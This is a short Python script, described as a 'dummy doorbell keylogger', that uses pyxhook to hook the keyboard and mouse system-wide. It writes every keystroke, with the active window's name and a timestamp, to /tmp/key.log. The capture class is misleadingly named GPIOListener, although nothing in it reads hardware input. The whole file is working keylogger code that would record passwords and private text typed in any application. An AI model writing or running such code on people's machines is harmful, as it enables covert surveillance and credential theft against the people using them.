#!/usr/bin/python

"""
Dummy doorbell keylogger using https://github.com/mattharrison/pykeyview/ 
from https://gist.github.com/2013732

"""

import pyxhook
import time

keymap = { 'apostrophe': "'",
           'comma': ",",
           'period': ".",
           'space': " ",
           'quotedbl': '"',
           'Return': '\n',
           'exclam': '!',
           'question': '?'}

class FileWriter():
    def __init__(self,logfile):
        print "opening " + logfile
        self.lastwin = ""
        self.f = open(logfile, 'a', 0)
        self.data = ""
        
    def event(self,event):
        win = event.WindowProcName + " " + event.Window
        if (self.lastwin != win):
            self.lastwin = win
            self.addlog("\nwc>>> " + win + " " + time.strftime('%s') + "\n")
        self.event = event

        key = str(event.Key)

        if (key in keymap):
            key = keymap[key]
            
        if (len(key) > 1):
            key = " [" + key + "] "
        self.addlog( key)
        
    def addlog(self,data):
        self.data += data

    def flush(self):
        self.f.write(self.data)
        self.data = ""

class GPIOListener(object):

    def __init__(self):
        self.fileWriter = FileWriter('/tmp/key.log')
        hm = pyxhook.HookManager()
        hm.HookKeyboard()
        hm.HookMouse()
        hm.KeyUp = self.fileWriter.event
        hm.start()

    def listen(self):
        if self.fileWriter.data:
            self.fileWriter.flush()


if __name__ == '__main__':
    gl = GPIOListener()
    while True:
        time.sleep(1)
        gl.listen()

